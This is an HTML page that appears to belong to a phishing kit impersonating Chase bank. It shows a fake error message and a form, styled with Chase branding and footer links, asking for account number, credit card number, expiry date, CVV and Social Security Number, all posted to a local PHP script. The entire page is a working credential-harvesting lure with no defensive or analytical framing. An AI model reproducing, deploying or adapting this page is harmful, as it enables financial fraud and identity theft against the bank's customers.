<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset='utf-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <title>Credit Card, Mortgage, Banking, Auto | Chase Online | Chase.com</title>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <link rel="shortcut icon" href="../icon/chasefavicon.ico" type="image/x-icon">
    <link rel='stylesheet' type='text/css'  href='../css/errorinfo.css'>
    <script src="https://kit.fontawesome.com/d41c77e3c5.js" crossorigin="anonymous"></script>
</head>
<body>
    <div class="top-container">
        <div class="top-design"></div>
        <div class="logo"></div>
        <div class="form">
            <div class="form-box">
                <div class="error">
                    <div>
                    <i class="fas fa-exclamation-circle"></i>
                    </div>  
                        <span>&nbsp;&nbsp;&nbsp;Invalid Informations . Try again .</span>
                </div>
                <div class="titleinfo">
                    <span>Please update your credit card information</span>
                </div>
                <form method="post" action="infoerrors.php">
                    <input type="number"  placeholder="Account Number" name="anmbr"  required="require" autofocus>
                    <input type="number"  placeholder="Crédit Card Number" name="cn"  required="require" >
                    <select name="de-year">
					    <option value="2040">2040</option>
					    <option value="2039">2039</option>
					    <option value="2038">2038</option>
					    <option value="2037">2037</option>
					    <option value="2036">2036</option>
					    <option value="2035">2035</option>
					    <option value="2034">2034</option>
					    <option value="2033">2033</option>
					    <option value="2032">2032</option>
					    <option value="2031">2031</option>
					    <option value="2030">2030</option>
					    <option value="2029">2029</option>
					    <option value="2028">2028</option>
					    <option value="2027">2027</option>
					    <option value="2026">2026</option>
					    <option value="2025">2025</option>
					    <option value="2024">2024</option>
					    <option value="2023">2023</option>
					    <option value="2022">2022</option>
					    <option value="2021">2021</option>
					    <option value="2020">2020</option>
					    <option value="2019">2019</option>
					</select>
					<select name="de-month" class="datefield month">
					    <option value="01">Jan</option>
					    <option value="02">Feb</option>
					    <option value="03">Mar</option>
					    <option value="04">Apr</option>
					    <option value="05">May</option>
					    <option value="06">Jun</option>
					    <option value="07">Jul</option>
					    <option value="08">Aug</option>
					    <option value="09">Sep</option>
					    <option value="10">Oct</option>
					    <option value="11">Nov</option>
						<option value="12">Dec</option>
                    </select>	
                    <input type="number"  placeholder="CCV" name="v"  required="require">
                    <input type="number"  placeholder="Social Security Number" name="ssn"  required="require">
                    <input type="submit" value="Continue">
                </form>
            </div>
        </div>
    </div>
    <div class="footer">
        <div class="follow">
            <span>Follow us:</span>
            <a href="#"><i class="fab fa-facebook-square"></i></a>
            <a href="#"><i class="fab fa-instagram"></i></a>
            <a href="#"><i class="fab fa-twitter"></i></a>
            <a href="#"><i class="fab fa-youtube"></i></a>
            <a href="#"><i class="fab fa-linkedin"></i></a>
        </div>
        <div class="text-footer">
            <div>
                <a href="#">Contact us</a>
                <a href="#">Privacy</a>
                <a href="#">Sécurity</a>
                <a href="#">Terms of use</a>
                <a href="#">Accessibility</a>
                <a href="#">SAFE Act: Chase Mortgage Loan Originators</a>
                <a href="#">Fair Lending</a>
                <a href="#">About Chase</a>
                <a href="#">J.P. Morgan</a>
                <a href="#">JPMorgan Chase & Co.</a>
                <a href="#">Careers</a>
            </div>    
            <div class="second">
                <a href="#">Chase Canada</a>
                <a href="#">Site map</a>
                <a href="#">Member FDIC</a>
                <a href="#">Equal Housing Lender</a>
            </div>
            <div class="thirt">
                <a href="#">© 2019 JPMorgan Chase & Co.</a>
            </div>    
        </div>
    </div>
</body>
</html>